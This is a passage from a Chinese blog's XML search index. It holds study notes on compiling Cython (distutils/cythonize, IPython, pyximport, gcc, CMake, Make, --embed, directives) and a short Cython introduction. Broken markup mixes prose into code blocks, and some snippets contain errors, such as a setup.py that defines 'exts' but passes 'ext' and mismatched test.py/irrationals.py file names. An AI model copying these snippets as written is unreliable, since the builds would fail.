      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>编译和运行Cython代码</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>Cython在运行之前必须要编译，编译可以是隐式的或者是显式的</p><h2 id="本章介绍几种Cython的编译方式让他可以同Python一起运行："><a href="#本章介绍几种Cython的编译方式让他可以同Python一起运行：" class="headerlink" title="本章介绍几种Cython的编译方式让他可以同Python一起运行："></a>本章介绍几种Cython的编译方式让他可以同Python一起运行：</h2><ul><li>Cython代码能够被编译并且在IPython中交互运行</li><li>Cython代码可以在导入的时候自动编译</li><li>Cython可以通过构建工具单独的编译</li><li>Cython可以结合到标准的构建系统中，如make, CMake或者SCons</li></ul><h2 id="Cython编译管道（Pipeline）"><a href="#Cython编译管道（Pipeline）" class="headerlink" title="Cython编译管道（Pipeline）"></a>Cython编译管道（Pipeline）</h2><p>管道的左右是转换Cython代码到Python的扩展模块，让其能被Python的解释器导入和使用。管道编译有两个步骤，第一个步骤是通过cython编译器转换Cython源码成优化过的平台独立的C或者C++代码，第二个步骤是通过标准的C或者C++编译器将生成的C或者C++源码编译成共享库。编译后的共享库是平台相关性的，在Linux或者Mac OS X系统下是.so扩展名的共享库，在Windows系统下是.pyd扩展名的动态链接库。</p><h2 id="标准的方法：使用distutils和cythonize"><a href="#标准的方法：使用distutils和cythonize" class="headerlink" title="标准的方法：使用distutils和cythonize"></a>标准的方法：使用distutils和cythonize</h2><p>通过使用Python的distutils模块和Cython的cythonize命令，显示的进行编译，也是最常用的方法。</p><h3 id="例子：将fib-pyx源码编译成Linux系统下的fib-so共享库或者Windows系统下的fib-pyd文件"><a href="#例子：将fib-pyx源码编译成Linux系统下的fib-so共享库或者Windows系统下的fib-pyd文件" class="headerlink" title="例子：将fib.pyx源码编译成Linux系统下的fib.so共享库或者Windows系统下的fib.pyd文件"></a>例子：将fib.pyx源码编译成Linux系统下的fib.so共享库或者Windows系统下的fib.pyd文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#fib.pyx</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(int n)</span>:</span></div><div class="line">    cdef int i</div><div class="line">    cdef double a=<span class="number">0.0</span>, b=<span class="number">1.0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        a, b = a + b, a</div><div class="line">    <span class="keyword">return</span> a</div><div class="line"></div><div class="line"><span class="comment">## C函数库调用</span></div><div class="line">如何使用 Cython 调用 C 库函数？简单来说，我们先以一个 C 标准库中的函数为例。 你不需要向你的代码中引入 额外的依赖，Cython 都已经帮你定义好了这些函数。所以你可以将这些函数直接 cimport 进来并使用。</div><div class="line">举个例子，比如说当你想用最简单的方法将char*类型的值转化为一个整型值时， 你可以使用atoi() 函数，这个函数是在stdlib.h 头文件中定义的。我们可以这样来写：</div><div class="line">```python</div><div class="line"><span class="keyword">from</span> libc.stdlib cimport atoi</div><div class="line"></div><div class="line">cdef parse_charptr_to_py_int(char* s):</div><div class="line">    <span class="keyword">assert</span> s <span class="keyword">is</span> <span class="keyword">not</span> NULL, <span class="string">"byte string value is NULL"</span></div><div class="line">    <span class="keyword">return</span> atoi(s)   <span class="comment"># note: atoi() has no error detection!</span></div></pre></td></tr></table></figure><p>你可以在 Cython 的源代码包<a href="https://github.com/cython/cython/tree/master/Cython/Includes中找到所有的标准" target="_blank" rel="external">https://github.com/cython/cython/tree/master/Cython/Includes中找到所有的标准</a> cimport 文件。这些文件保存在.pxd 文件中，这是一种标准再模块间共享 Cython 函数声明的方法。<br>Cython 也有一整套的 Cython 的C-API 函数声明集。 例如，为了测试你的 Cython 代码的 C 编译时间，你可以这样做：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> cpython.version cimport PY_VERSION_HEX</div><div class="line"></div><div class="line"><span class="comment"># Python version &gt;= 3.2 final ?</span></div><div class="line"><span class="keyword">print</span> PY_VERSION_HEX &gt;= <span class="number">0x030200F0</span></div></pre></td></tr></table></figure></p><p>Cython 也提供了 C math 库的声明：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> libc.math cimport sin</div><div class="line"></div><div class="line">cdef double f(double x):</div><div class="line">    <span class="keyword">return</span> sin(x*x)</div></pre></td></tr></table></figure></p><p>#setup.py<br>from distutils.core import setup<br>from Cython.Build import cythonize</p><p>setup(ext_modules=cythonize(‘fib.pyx’))</p><p>#通过命令行编译<br>$ python setup.py build_ext –inplace<br>等价于<br>$ python setup.py build_ext -i</p><p>#Windows系统要指定额外的参数<br>python setup.py build_ext -i –compiler=mingw32 -DMS_WIN64<br>或者<br>python setup.py build_ext -i –compiler=msvc<br>根据编译器的不同填写参数</p><p>#直接可以在IPython中import fib使用该模块<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">### 例子：使用Cython包装C和C++代码</div><div class="line">```python</div><div class="line"><span class="comment">/*cfib.h*/</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __CFIB_H__</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __CFIB_H__</span></div><div class="line"></div><div class="line"><span class="keyword">double</span> cfib(<span class="keyword">int</span> n);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="comment">/*cfib.c*/</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cfib.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">double</span> cfib(<span class="keyword">int</span> n) &#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">double</span> a=<span class="number">0.0</span>, b=<span class="number">1.0</span>, tmp;</div><div class="line">    <span class="built_in">for</span> (i=<span class="number">0</span>; i&lt;n; ++i) &#123;</div><div class="line">        tmp = a; a = a + b; b = tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line">#wrap_fib.pyx</div><div class="line"></div><div class="line">cdef <span class="keyword">extern</span> from <span class="string">"cfib.h"</span>:</div><div class="line">    <span class="keyword">double</span> cfib(<span class="keyword">int</span> n)</div><div class="line"></div><div class="line">def fib(n):</div><div class="line">    <span class="string">''</span><span class="string">' Returns the nth Fibonacci number.'</span><span class="string">''</span></div><div class="line">    <span class="built_in">return</span> cfib(n)</div><div class="line"></div><div class="line"><span class="meta">#setup.py</span></div><div class="line"></div><div class="line">from distutils.core <span class="keyword">import</span> <span class="built_in">setup</span>, Extension</div><div class="line">from Cython.Build <span class="keyword">import</span> cythonize</div><div class="line"></div><div class="line">exts = cythonize([Extension(<span class="string">"wrap_fib"</span>, sources=[<span class="string">"cfib.c"</span>, <span class="string">"wrap_fib.pyx"</span>])])</div><div class="line"></div><div class="line"><span class="built_in">setup</span>(ext_modules=cythonize(ext))</div><div class="line"></div><div class="line">#如果提供的是预编译后的动态链接库libfib.so而不是源码，则<span class="built_in">setup</span>.py如下</div><div class="line">from distutils.core <span class="keyword">import</span> <span class="built_in">setup</span>, Extension</div><div class="line">from Cython.Build <span class="keyword">import</span> cythonize</div><div class="line"></div><div class="line">ext = Extension( name=<span class="string">"wrap_fib"</span>, sources=[<span class="string">"wrap_fib.pyx"</span>], library_dirs=[<span class="string">"/path/to/libfib.so"</span>], libraries=[<span class="string">"fib"</span>] )</div><div class="line"></div><div class="line"><span class="built_in">setup</span>(ext_modules=cythonize(ext))</div></pre></td></tr></table></figure></p><h2 id="在IPython中和Cython进行交互"><a href="#在IPython中和Cython进行交互" class="headerlink" title="在IPython中和Cython进行交互"></a>在IPython中和Cython进行交互</h2><p>在IPython中可以通过魔法命令%load_ext Cython和%%cython与Cython代码进行交互<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">3</span>]: %load_ext Cython</div><div class="line"></div><div class="line">In [<span class="number">4</span>]: %%cython</div><div class="line">   ...: <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(int n)</span>:</span></div><div class="line">   ...:      cdef int i</div><div class="line">   ...:      cdef double a=<span class="number">0.0</span>, b=<span class="number">1.0</span></div><div class="line">   ...:      <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">   ...:          a, b = a+b, a</div><div class="line">   ...:      <span class="keyword">return</span> a</div><div class="line">   ...: </div><div class="line"></div><div class="line">In [<span class="number">5</span>]: fib(<span class="number">10</span>)</div><div class="line">Out[<span class="number">5</span>]: <span class="number">55.0</span></div></pre></td></tr></table></figure></p><p>除了%%cython命令外还有%%cython_inline和%%cython_pyximport两个命令可以使用。</p><h2 id="使用pyximport在导入时-进行编译"><a href="#使用pyximport在导入时-进行编译" class="headerlink" title="使用pyximport在导入时 进行编译"></a>使用pyximport在导入时 进行编译</h2><p>pyximport在import时识别.pyx扩展模块，然后自动将他们编译后导入<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> pyximport</div><div class="line"></div><div class="line">In [<span class="number">2</span>]: pyximport.install()</div><div class="line">Out[<span class="number">2</span>]: (<span class="keyword">None</span>, &lt;pyximport.pyximport.PyxImporter at <span class="number">0x7fc79e1ee588</span>&gt;)</div><div class="line"></div><div class="line">In [<span class="number">3</span>]: <span class="keyword">import</span> fib</div><div class="line"></div><div class="line">In [<span class="number">4</span>]: fib.__file__</div><div class="line">Out[<span class="number">4</span>]: <span class="string">'/home/dj/.pyxbld/lib.linux-x86_64-3.5/fib.cpython-35m-x86_64-linux-gnu.so'</span></div></pre></td></tr></table></figure></p><p>由于pyximport依赖cython编译器和C编译器，往往生产环境都不在控制中。</p><h2 id="管理pyximport的依赖"><a href="#管理pyximport的依赖" class="headerlink" title="管理pyximport的依赖"></a>管理pyximport的依赖</h2><ul><li>有时候Cython源文件依赖其他的源文件如C、C++源代码，头文件或者其他的Cython源代码，在这种情况下当依赖文件更新的时候pyximport必须重新编译导入.pyx文件，这个时候可以使用.pyxdeps扩展名的文件，来列出.pyx所依赖的所有文件，文件内容可以是通配符也可以是依赖文件的列表。如果.pyxdeps文件存在，pyximport在导入的时候会比较.pyx的的修改时间，将其重新编译导入。</li><li>怎样告诉pyximport编译和链接几个源文件到一个扩展模块，这个时候需要.pyxbld文件，其目的是为不同的情况定制pyximport</li><li>像.pyxdeps和.pyxbld文件都是基于相同文件名的Cython的.pyx源代码，用.pyxbld替换.pyx扩展，他们应该被放置在被导入的.pyx的文件的同一个目录</li></ul><p>.pyxbld文件中的是什么内容：一个或者两个函数</p><ul><li><p>make_ext(modname, pyxfilename)：如果定义了该函数，该函数接受两个参数，他返回一个distutils.extension.Extension实例，或者等效于调用Cython.Build.cythonize返回的结果，允许用户定制Extension，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_ext</span><span class="params">(modname, pyxfilename)</span>:</span></div><div class="line">    <span class="keyword">from</span> distutils.extension <span class="keyword">import</span> Extension</div><div class="line">    <span class="keyword">return</span> Extension(modname,</div><div class="line">            sources=[pyxfilename, <span class="string">'_fib.c'</span>],</div><div class="line">            include_dirs = [<span class="string">'.'</span>])</div></pre></td></tr></table></figure></li><li><p>make_setup_args()：如果这个函数定义了，pyximport获取额外的参数传给distutils.core.setup，用于控制setup的编译过程，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_setup_args</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> dict(script_args=[<span class="string">"--compiler=mingw32"</span>])</div></pre></td></tr></table></figure></li></ul><h3 id="完整的依赖扩展的例子"><a href="#完整的依赖扩展的例子" class="headerlink" title="完整的依赖扩展的例子"></a>完整的依赖扩展的例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">/*_fib.c*/</div><div class="line"></div><div class="line"><span class="comment">#include "_fib.h"</span></div><div class="line"></div><div class="line">unsigned long int fib(unsigned long int n)</div><div class="line">&#123;</div><div class="line">    unsigned long int a, b, tmp, i;</div><div class="line">    a = <span class="number">0</span>; b = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; ++i) &#123;</div><div class="line">        tmp = a; a += b; b = tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*_fib.h*/</div><div class="line"></div><div class="line"><span class="comment">#ifndef __FIB_H__</span></div><div class="line"><span class="comment">#define __FIB_H__</span></div><div class="line"></div><div class="line">unsigned long int fib(unsigned long int);</div><div class="line"></div><div class="line"><span class="comment">#endif</span></div><div class="line"></div><div class="line"><span class="comment">#fib.pyx</span></div><div class="line"></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"_fib.h"</span>:</div><div class="line">    unsigned long int _cfib <span class="string">"fib"</span>(unsigned long int)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cfib</span><span class="params">(unsigned long int n)</span>:</span></div><div class="line">    <span class="keyword">return</span> _cfib(n)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(long n)</span>:</span></div><div class="line">    <span class="string">'''Returns the nth Fibonacci number.'''</span></div><div class="line">    cdef long a=<span class="number">0</span>, b=<span class="number">1</span>, i</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        a, b = a + b, a</div><div class="line">    <span class="keyword">return</span> a</div><div class="line"></div><div class="line"><span class="comment">#fib.pyxbld</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_ext</span><span class="params">(modname, pyxfilename)</span>:</span></div><div class="line">    <span class="keyword">from</span> distutils.extension <span class="keyword">import</span> Extension</div><div class="line">    <span class="keyword">return</span> Extension(modname,</div><div class="line">            sources=[pyxfilename, <span class="string">'_fib.c'</span>],</div><div class="line">            include_dirs = [<span class="string">'.'</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_setup_args</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> dict(script_args=[<span class="string">"--compiler=mingw32"</span>])</div><div class="line"></div><div class="line"><span class="comment">#fib.pyxdeps</span></div><div class="line"></div><div class="line">_fib.*</div><div class="line"></div><div class="line"><span class="comment">#user_pyximport.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pyximport</div><div class="line">pyximport.install()</div><div class="line"></div><div class="line"><span class="keyword">import</span> fib</div><div class="line"></div><div class="line">print(<span class="string">"fib.__file__"</span>, fib.__file__)</div><div class="line">print(<span class="string">"fib.fib(90):"</span>, fib.fib(<span class="number">90</span>))</div><div class="line">print(<span class="string">"fib.cfib(90):"</span>, fib.cfib(<span class="number">90</span>))</div></pre></td></tr></table></figure><h2 id="自己动手手动编译"><a href="#自己动手手动编译" class="headerlink" title="自己动手手动编译"></a>自己动手手动编译</h2><p>我们想从fib.pyx源代码创建一个扩展模块，但是不想使用distutils、IPython或者是pyximport，我们该怎么办？<br>这里有两步可以做到：第一步从Cython源码生成C/C++源码，第二步编译C/C++源码为一个扩展模块。<br>第一步很简单，用cython命令，将Cython源码转换成C/C++源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cython fib.pyx</div></pre></td></tr></table></figure></p><p>第二步使用GCC编译C/C++源码，全部过程如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ CFLAGS=$(python-config --cflags)</div><div class="line">$ LDFLAGS=$(python-config --ldflags)</div><div class="line">$ cython fib.pyx <span class="comment"># --&gt; outputs fib.c</span></div><div class="line">$ gcc -c fib.c $&#123;CFLAGS&#125; <span class="comment"># outputs fib.o</span></div><div class="line">$ gcc fib.o -o fib.so -shared $&#123;LDFLAGS&#125; <span class="comment"># --&gt; outputs fib.so</span></div></pre></td></tr></table></figure></p><p>手动编译对平台环境要求较高，不同的平台环境参数不一样</p><h2 id="用其他构建系统使用Cython"><a href="#用其他构建系统使用Cython" class="headerlink" title="用其他构建系统使用Cython"></a>用其他构建系统使用Cython</h2><h3 id="CMake和Cython"><a href="#CMake和Cython" class="headerlink" title="CMake和Cython"></a>CMake和Cython</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Detects and activates Cython</span></div><div class="line">include(UseCython)</div><div class="line"></div><div class="line"><span class="comment"># Specifies that Cython source files should generate C++</span></div><div class="line">set_source_files_properties($&#123;CYTHON_CMAKE_EXAMPLE_SOURCE_DIR&#125;/src/file.pyx   PROPERTIES   CYTHON_IS_CXX TRUE )</div><div class="line"></div><div class="line"><span class="comment"># Adds and compiles Cython source into an extension module</span></div><div class="line">cython_add_module( modname file.pyx   cpp_source.cxx)</div></pre></td></tr></table></figure><h3 id="SCons和Cython"><a href="#SCons和Cython" class="headerlink" title="SCons和Cython"></a>SCons和Cython</h3><h3 id="Make和Cython"><a href="#Make和Cython" class="headerlink" title="Make和Cython"></a>Make和Cython</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INCDIR := $(shell python -c  <span class="string">"from distutils import sysconfig; print(sysconfig.get_python_inc())"</span>)</div><div class="line"></div><div class="line">LIBS := $(shell python -c   <span class="string">"from distutils import sysconfig;  print(sysconfig.get_config_var('LIBS'))"</span>)</div></pre></td></tr></table></figure><h2 id="将Python源码利用Cython编译成可执行二进制"><a href="#将Python源码利用Cython编译成可执行二进制" class="headerlink" title="将Python源码利用Cython编译成可执行二进制"></a>将Python源码利用Cython编译成可执行二进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># test.py</span></div><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pi, e</div><div class="line"><span class="keyword">print</span> <span class="string">"e**pi == &#123;:.2f&#125;"</span>.format(e**pi)</div><div class="line"><span class="keyword">print</span> <span class="string">"pi**e == &#123;:.2f&#125;"</span>.format(pi**e)</div><div class="line"></div><div class="line"><span class="comment">#使用cython编译器将Python源码转换成C代码</span></div><div class="line">$ cython --embed irrationals.py</div><div class="line"></div><div class="line"><span class="comment">#将C代码编译成可执行二进制</span></div><div class="line">$ gcc $(python-config --cflags) $(python-config --ldflags) ./irrationals.c</div><div class="line"><span class="comment">#注意：该二进制执行还是依赖Python的动态链接库</span></div></pre></td></tr></table></figure><h2 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h2><p>Cython提供了编译指令来控制如何编译Cython源码，指令能指定四个不同的作用域，并且能很容易的打开或者关闭测试或者Debug选项，但是并不是所有的指令都能设置每一个域。<br>所有的指令都可以在Cython代码的第一行通过注释来添加，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cython: nonecheck=True</span></div><div class="line"><span class="comment"># cython: boundscheck=False</span></div><div class="line"></div><div class="line">也可以通过逗号分隔不同的指令：</div><div class="line"><span class="comment"># cython: nonecheck=True, boundscheck=False</span></div></pre></td></tr></table></figure></p><p>当然，我们也可以通过命令行参数-X或者–directive选项来设置编译指令，如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cython --directive nonecheck=<span class="keyword">False</span> source.pyx</div></pre></td></tr></table></figure></p><p>有些编译指令支持函数和上下文级别的作用域的控制，如装饰器和上下文管理器，实例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">cimport cython</div><div class="line"></div><div class="line"><span class="meta">@cython.boundscheck(False)</span></div><div class="line"><span class="meta">@cython.wraparound(False)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_indexing</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># ...</span></div><div class="line"></div><div class="line"></div><div class="line">cimport cython</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_indexing</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">with</span> cython.boundscheck(<span class="keyword">False</span>), cython.wraparound(<span class="keyword">False</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</div><div class="line">            sum += a[i]</div></pre></td></tr></table></figure></p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一章 Cython简介</title>
      <link href="/2017/07/02/%E7%AC%AC%E4%B8%80%E7%AB%A0-Cython%E7%AE%80%E4%BB%8B/"/>
      <url>/2017/07/02/%E7%AC%AC%E4%B8%80%E7%AB%A0-Cython%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Cython简介</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="Cython基础"><a href="#Cython基础" class="headerlink" title="Cython基础"></a>Cython基础</h2><p>Cython 是Python语言的一个超集，对其你可以为Python写C 或C++模块。Cython也使得你可以从已编译的C库中调用函数。使用Cython让你得以发挥Python 的变量与操作的强类型优势。</p><p>Cython 的本质可以总结如下：Cython 是包含 C 数据类型的 Python。</p><p>Cython 是 Python：几乎所有 Python 代码都是合法的 Cython 代码。 （存在一些限制，但是差不多也可以。） Cython 的编译器会转化 Python 代码为 C 代码，这些 C 代码均可以调用 Python/C 的 API。</p><p>Cython 可不仅仅包含这些，Cython 中的参数和变量还可以以 C 数据类型来声明。代码中的 Python 值和 C 的值可以自由地交叉混合（intermixed）使用, 所有的转化都是自动进行。Python 中的引用计数维护（Reference count maintenance）和错误检查（error checking）操作同样是自动进行的，并且全面支持 Python 的异常处理工具（facilities），包括 try-except 和 try-finally，即便在其中操作 C 数据都是可以的。</p><p>本系列文章是笔者阅读Kurt W. Smith的著作《Cython》的学习笔记，国内目前没有中文版，只有英文版，笔者将自己觉得重要的内容进行整理记录，如有疑问，请参考原著。</p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
